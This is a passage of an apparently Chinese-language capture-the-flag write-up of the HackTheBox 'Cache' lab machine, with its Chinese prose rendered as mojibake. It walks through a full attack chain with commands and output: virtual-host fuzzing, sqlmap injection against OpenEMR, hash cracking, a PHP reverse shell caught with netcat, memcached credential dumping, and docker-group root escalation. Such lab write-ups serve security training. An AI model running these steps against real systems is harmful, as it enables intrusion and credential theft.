    <span class="keyword">var</span> Username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Username != <span class="string">&quot;ash&quot;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Username didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_username = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&quot;#loginform&quot;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* Act on the event */</span></span><br><span class="line">        error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectPassword();</span><br><span class="line">         error_username = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectUsername();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(error_correctPassword == <span class="literal">false</span> &amp;&amp; error_username ==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>æœ‰ç™»å½•åå’Œå¯†ç <code>ash:H@v3_fun</code>ï¼ŒæˆåŠŸç™»å½•ä¹‹åä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œå†æŸ¥çœ‹<code>Author</code>é¡µé¢ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526164125.png" style="zoom: 50%;" />
<p>å®åœ¨æ˜¯æ²¡å•¥æ€è·¯ï¼Œå»HTB forumç§èŠä¸€ä¸‹å„ä½å¤§ä½¬ï¼Œæç¤ºæˆ‘ç”¨cewlå·¥å…·æå–Autor pageâ€™s informationï¼Œä»¥åŠFUZZ HOSTã€‚</p>
<p>åæ¥æ‰çŸ¥é“ç”¨è¿™ä¸ªé¡µé¢çš„å•è¯å’Œcewlå·¥å…·ç”Ÿæˆä¸€ä¸ªåŒ…å«åŸŸåçš„å­—å…¸ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Cache [16:24:16]</span><br><span class="line">$ cewl -w wordlist.txt -d 10 -m 1 http:&#x2F;&#x2F;10.10.10.188&#x2F;author.html</span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;)</span><br></pre></td></tr></table></figure>
<p>ç”¨wfuzzæŸ¥æ‰¾åŸŸåï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Cache [16:52:57] </span><br><span class="line">$ wfuzz -w wordlist.txt -H &quot;HOST: FUZZ.htb&quot; -u http:&#x2F;&#x2F;10.10.10.188&#x2F; --hc 400 --hh 8193</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.188&#x2F;</span><br><span class="line">Total requests: 42</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000000037:   302        0 L      0 W      0 Ch        &quot;HMS&quot;</span><br><span class="line"></span><br><span class="line">Total time: 2.130227</span><br><span class="line">Processed Requests: 42</span><br><span class="line">Filtered Requests: 41</span><br><span class="line">Requests&#x2F;sec.: 19.71620</span><br></pre></td></tr></table></figure>
<blockquote>
<p>â€“hc 404 --hh 8193 è¿™ä¸¤ä¸ªå‚æ•°æ˜¯ä¸ºäº†é™åˆ¶ä¸€äº›æ— æ•ˆçš„è¿”å›æ¶ˆæ¯ã€‚</p>
</blockquote>
<p>æŠŠ<code>HMS.htb</code>åŠ å…¥åˆ°<code>/etc/hosts</code>æ–‡ä»¶ä¸­ã€‚</p>
<h4 id="HMS-htb">HMS.htb</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526165608.png" alt=""></p>
<p>å¼±å£ä»¤æ— æ•ˆï¼ŒæŸ¥æ‰¾æœ‰æ²¡æœ‰å…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526165926.png" alt=""></p>
<p>å‘ç°å·²ç»æœ‰å¾ˆå¤šä¸åŒç‰ˆæœ¬çš„exploitï¼Œå†å°è¯•ç”¨<code>OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution</code>ï¼Œè¿è¡Œä¹‹åæç¤ºè¦ç³»ç»Ÿçš„è´¦å·å’Œå¯†ç ã€‚Google OpenEMRï¼Œåœ¨YouTubeä¸Šçœ‹åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥çš„ç›¸å…³æ¼æ´ã€‚</p>
<blockquote>
<p><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a></p>
</blockquote>
<p>æ ¹æ®è§†é¢‘çš„æ­¥éª¤ï¼Œé¦–å…ˆè®¿é—®<code>http://hms.htb/portal</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526172026.png" style="zoom:67%;" />
<p>ç‚¹å‡»<code>Register</code>åè®¿é—®<code>http://hms.htb/portal/add_edit_event_user.php</code>ï¼Œè¿™é‡Œçš„<code>eid</code>å‚æ•°å­˜åœ¨SQLæ³¨å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200527114620.png" alt=""></p>
<p>ç”¨burpæ‹¦æˆªè¯·æ±‚ï¼Œå¹¶ä¸”æŠŠè¯·æ±‚æ•°æ®ä¿å­˜åˆ°<code>req.txt</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;portal&#x2F;add_edit_event_user.php?eid&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR&#x3D;0bcd8bfgl4rl2sfc8qmg63u09b; PHPSESSID&#x3D;juj09jki6pu38k34afv60j3vb9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure>
<h4 id="dump-database">dump database</h4>
<p>ç”¨sqlmapçˆ†ç ´æ•°æ®åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap -r req.txt --dbs --batch</span><br><span class="line">[11:52:46] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.1</span><br><span class="line">[11:52:46] [INFO] fetching database names</span><br><span class="line">[11:52:47] [INFO] retrieved: <span class="string">&#x27;information_schema&#x27;</span></span><br><span class="line">[11:52:48] [INFO] retrieved: <span class="string">&#x27;openemr&#x27;</span></span><br><span class="line">available databases [2]:                                                                                                                                                                                         </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] openemr</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ¥ç€å°±æ˜¯sqlmapä¸€æŠŠæ¢­ï¼Œæ‰¾åˆ°<code>users_secure</code>æ•°æ®è¡¨ï¼ŒæŸ¥çœ‹<code>username</code>å’Œ<code>password</code>å­—æ®µï¼Œdump</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[12:03:13] [INFO] fetching entries of column(s) &#39;&#96;password&#96;, username&#39; for table &#39;users_secure&#39; in database &#39;openemr&#39;</span><br><span class="line">Database: openemr</span><br><span class="line">Table: users_secure</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>ç”¨johnçˆ†ç ´hashå¯†ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali @ kali in ~/HackTheBox/Cache [12:11:02] </span></span><br><span class="line">$ sudo john -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span> </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 32 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-05-27 12:11) 1.694g/s 1464p/s 1464c/s 1464C/s tristan..felipe</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç™»å½•ç”¨æˆ·åå’Œå¯†ç ï¼š<code>openemr_admin:xxxxxx</code>ã€‚</p>
<h4 id="upload-reverse-shell">upload reverse shell</h4>
<p>é€šè¿‡<code>Administration-&gt;Files</code>æ¨¡å—ä¸Šä¼ reverse shellï¼Œå†™å…¥<code>letter_templates/custom_pdf.php</code>æ–‡ä»¶ä¸­ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200528100756.png" alt=""></p>
<p>æœ¬æœºç›‘å¬4444ç«¯å£ï¼Œæµè§ˆå™¨è®¿é—®<code>http://hms.htb/sites/default/letter_templates/custom_pdf.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.2] from (UNKNOWN) [10.10.10.188] 54188</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2111): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/sites/default/letter_templates$ id</span><br><span class="line">&lt;.htb/public_html/sites/default/letter_templates$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>ç”¨<code>functionality.js</code>ä¸­çš„ç™»å½•å‡­è¯åˆ‡æ¢<code>ash</code>ç”¨æˆ·ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@cache:/var/www$ su ash</span><br><span class="line">su ash</span><br><span class="line">Password: H@v3_fun</span><br><span class="line">ash@cache:/var/www$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(ash) gid=1000(ash) groups=1000(ash)</span><br><span class="line">ash@cache:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">93bf------------------------8dfe</span><br></pre></td></tr></table></figure>
<h4 id="memcached-exploit">memcached exploit</h4>
<p>æŸ¥çœ‹æœ¬åœ°è¿è¡ŒæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@cache:~$ netstat -tulpn</span><br><span class="line">netstat -tulpn</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -</span><br></pre></td></tr></table></figure>
<p>11211ç«¯å£æ˜¯è¿è¡ŒmemcachedæœåŠ¡ï¼Œåˆ©ç”¨æ–¹å¼ï¼š</p>
<blockquote>
<p><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a></p>
<p><a href="https://niiconsulting.com/checkmate/2013/05/memcache-exploit/">https://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></p>
</blockquote>
<p>fetch the slab statisticsï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@cache:~$ telnet 127.0.0.1 11211</span><br><span class="line">telnet 127.0.0.1 11211</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span></span><br><span class="line">stats slabs</span><br><span class="line">stats slabs</span><br><span class="line">STAT 1:chunk_size 96</span><br><span class="line">STAT 1:chunks_per_page 10922</span><br><span class="line">STAT 1:total_pages 1</span><br><span class="line">STAT 1:total_chunks 10922</span><br><span class="line">STAT 1:used_chunks 5</span><br><span class="line">STAT 1:free_chunks 10917</span><br><span class="line">STAT 1:free_chunks_end 0</span><br><span class="line">STAT 1:mem_requested 371</span><br><span class="line">STAT 1:get_hits 1</span><br><span class="line">STAT 1:cmd_set 7730</span><br><span class="line">STAT 1:delete_hits 0</span><br><span class="line">STAT 1:incr_hits 0</span><br><span class="line">STAT 1:decr_hits 0</span><br><span class="line">STAT 1:cas_hits 0</span><br><span class="line">STAT 1:cas_badval 0</span><br><span class="line">STAT 1:touch_hits 0</span><br><span class="line">STAT active_slabs 1</span><br><span class="line">STAT total_malloced 1048576</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡slab idæŸ¥çœ‹ç»„ç»‡ç»“æ„itemsï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stats items</span><br><span class="line">stats items</span><br><span class="line">STAT items:1:number 5</span><br><span class="line">STAT items:1:number_hot 0</span><br><span class="line">STAT items:1:number_warm 0</span><br><span class="line">STAT items:1:number_cold 5</span><br><span class="line">STAT items:1:age_hot 0</span><br><span class="line">STAT items:1:age_warm 0</span><br><span class="line">STAT items:1:age 52</span><br><span class="line">STAT items:1:evicted 0</span><br><span class="line">STAT items:1:evicted_nonzero 0</span><br><span class="line">STAT items:1:evicted_time 0</span><br><span class="line">STAT items:1:outofmemory 0</span><br><span class="line">STAT items:1:tailrepairs 0</span><br><span class="line">STAT items:1:reclaimed 0</span><br><span class="line">STAT items:1:expired_unfetched 0</span><br><span class="line">STAT items:1:evicted_unfetched 0</span><br><span class="line">STAT items:1:evicted_active 0</span><br><span class="line">STAT items:1:crawler_reclaimed 0</span><br><span class="line">STAT items:1:crawler_items_checked 220</span><br><span class="line">STAT items:1:lrutail_reflocked 0</span><br><span class="line">STAT items:1:moves_to_cold 7735</span><br><span class="line">STAT items:1:moves_to_warm 0</span><br><span class="line">STAT items:1:moves_within_lru 0</span><br><span class="line">STAT items:1:direct_reclaims 0</span><br><span class="line">STAT items:1:hits_to_hot 0</span><br><span class="line">STAT items:1:hits_to_warm 0</span><br><span class="line">STAT items:1:hits_to_cold 1</span><br><span class="line">STAT items:1:hits_to_temp 0</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>dump all the keysï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stats cachedump 1 0</span><br><span class="line">stats cachedump 1 0</span><br><span class="line">ITEM link [21 b; 0 s]</span><br><span class="line">ITEM user [5 b; 0 s]</span><br><span class="line">ITEM passwd [9 b; 0 s]</span><br><span class="line">ITEM file [7 b; 0 s]</span><br><span class="line">ITEM account [9 b; 0 s]</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>è¯»å–<code>user</code>å’Œ<code>passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get user</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line">get passwd</span><br><span class="line">get passwd</span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>SSHç™»å½•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh luffy@10.10.10.188</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.188 (10.10.10.188)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.188<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">luffy@10.10.10.188&#x27;</span>s password:</span><br><span class="line">luffy@cache:~$ id</span><br><span class="line">uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿåˆ°luffyæ˜¯å±äºdockerç”¨æˆ·ç»„ã€‚</p>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>GTFObins docker</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200528104211.png" style="zoom:80%;" />
<p>æŸ¥çœ‹dockeré•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">luffy@cache:~$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              2ca708c1c9cc        8 months ago        64.2MB</span><br></pre></td></tr></table></figure>
<p>ç…§ç€GTFObinsç»™çš„æ–¹æ³•è¿›è¡Œææƒï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br><span class="line">root@2b2647044657:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@2b2647044657:/<span class="comment"># cd  </span></span><br><span class="line">root@2b2647044657:~<span class="comment"># cat root.txt</span></span><br><span class="line">32fc------------------------ceab</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Reference">0x04 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>OpenEmr Vulnerability ( video)</td>
<td><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a></td>
</tr>
<tr>
<td>Memecache</td>
<td><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a></td>
</tr>
<tr>
<td>Memcacahe</td>
<td><a href="https://niiconsulting.com/checkmate/2013/05/memcache-exploit/">https://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></td>
</tr>
<tr>
<td>Docker</td>
<td><a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
</search>
